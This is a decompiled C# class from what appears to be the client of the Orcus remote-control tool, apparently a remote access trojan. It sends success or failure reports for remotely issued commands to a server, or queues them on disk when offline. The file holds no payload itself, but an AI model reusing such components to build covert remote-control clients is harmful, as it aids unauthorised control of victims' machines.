using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommandManagement;

public class DynamicCommandFeedbackFactory : IFeedbackFactory
{
	private class MessageInfo
	{
		public string Message { get; }

		public MessageType MessageType { get; }

		public DateTime Timestamp { get; }

		public MessageInfo(string message, MessageType messageType)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			Message = message;
			MessageType = messageType;
			Timestamp = DateTime.UtcNow;
		}
	}

	private readonly int _callbackId;

	private readonly List<MessageInfo> _messages;

	private readonly ServerConnection _serverConnection;

	private bool _commandSuceeded;

	private bool _isPushed;

	private string _message;

	public DynamicCommandFeedbackFactory(ServerConnection serverConnection, int callbackId)
	{
		_serverConnection = serverConnection;
		_callbackId = callbackId;
		_commandSuceeded = true;
		_messages = new List<MessageInfo>();
	}

	public void Succeeded()
	{
		if (!_isPushed)
		{
			_commandSuceeded = true;
			Push();
		}
	}

	public void Failed()
	{
		if (!_isPushed)
		{
			_commandSuceeded = false;
			Push();
		}
	}

	public void Succeeded(string message)
	{
		_message = message;
		Succeeded();
	}

	public void Failed(string message)
	{
		_message = message;
		Failed();
	}

	public void SendMessage(string message, MessageType messageType)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		_messages.Add(new MessageInfo(message, messageType));
	}

	private void Push()
	{
		if (_serverConnection != null && _serverConnection.IsConnected)
		{
			lock (_serverConnection.SendLock)
			{
				PushData(_serverConnection.BinaryWriter);
			}
		}
		else
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Consts.SendToServerPackages);
			if (!directoryInfo.Exists)
			{
				directoryInfo.Create();
			}
			using FileStream output = new FileStream(FileExtensions.GetUniqueFileName(directoryInfo.FullName), FileMode.CreateNew, FileAccess.Write);
			using BinaryWriter binaryWriter = new BinaryWriter(output);
			PushData(binaryWriter);
		}
		_isPushed = true;
	}

	public static void PushEvent(BinaryWriter binaryWriter, int callBackId, ActivityType activityType, string message)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		byte[] array = ((!string.IsNullOrEmpty(message)) ? Encoding.UTF8.GetBytes(message) : null);
		binaryWriter.Write((byte)13);
		binaryWriter.Write(((array != null) ? array.Length : 0) + 4 + 1);
		binaryWriter.Write(callBackId);
		binaryWriter.Write((byte)activityType);
		if (array != null)
		{
			binaryWriter.Write(array);
		}
	}

	private void PushData(BinaryWriter binaryWriter)
	{
		MessageInfo messageInfo;
		PushEvent(message: (!string.IsNullOrEmpty(_message)) ? _message : (((messageInfo = _messages.LastOrDefault((MessageInfo x) => (int)x.MessageType != 2)) == null) ? null : messageInfo.Message), binaryWriter: binaryWriter, callBackId: _callbackId, activityType: (ActivityType)(_commandSuceeded ? 1 : 2));
	}
}
